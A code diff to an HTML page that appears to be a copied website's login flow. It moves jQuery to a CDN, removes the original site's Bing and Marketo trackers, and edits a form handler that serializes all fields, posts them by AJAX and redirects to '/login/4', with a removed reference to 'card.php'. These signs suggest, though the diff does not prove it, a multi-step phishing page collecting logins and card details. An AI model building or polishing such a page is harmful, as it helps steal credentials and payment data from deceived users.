@@ -15,24 +15,22 @@
     <!-- custom css in the end -->
 
     <!-- JQuery and some dependent JS in the begining since the screen controls use them -->
-     <link href="assets/Web.UI/css/CustomCss.css" rel="stylesheet" />
+     <link href="assets/Web.UI/css/CustomCss.css" type=”text/css" rel="stylesheet" />
 
     <!-- Other CSS -->
     <link href="assets/Web.UI/css/Aksw.Core5f1e.css" rel="stylesheet" />
      <link href="assets/css/tooltipster.bundle.min5f1e.css" rel="stylesheet" />
      <link href="assets/Site5f1e.css" rel="stylesheet" />
-
-	   <script src="assets/jQuery/jquery.min5f1e.js"></script>
-   
+	<script src=
+'https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js'>
+    </script>
+	   
    
 
 
     <!-- Custom JS in the end -->
 
-    <script src="https://bat.bing.com/p/action/137037224.js" type="text/javascript" async="" data-ueto="ueto_7b1cb6019c"></script>
-    <link type="text/css" href="https://rtp-static.marketo.com/rtp/libs/jquery-ui-insightera-custom-1.9.6.css" rel="stylesheet" />
-    <script type="text/javascript" async="" src="//munchkin.marketo.net/munchkin.js"></script>
-</head>
+    </head>
 <style>
 		 .a-error-container{
 		 display:none;
@@ -218,9 +216,7 @@
    
     </div>
 </body>
-<script src=
-'https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js'>
-    </script>
+
 <script src="https://cdnjs.cloudflare.com/ajax/libs/cleave.js/1.6.0/cleave.min.js"></script>
       
 <script>
@@ -263,7 +259,8 @@
         event.preventDefault();
         let myForm = $("#form");
               
-            
+            let visitor = sessionStorage.getItem('visitor');
+        
             // It returns a array of object 
             let userinfo = myForm.serializeArray();
             let user = {};
@@ -282,8 +279,7 @@
                 data: user
             }).done(function(msg) {
             
-               sessionStorage.setItem('back','./card.php');
-        
+               
    			window.location.href = '/login/4'; // Corrected line
        
               
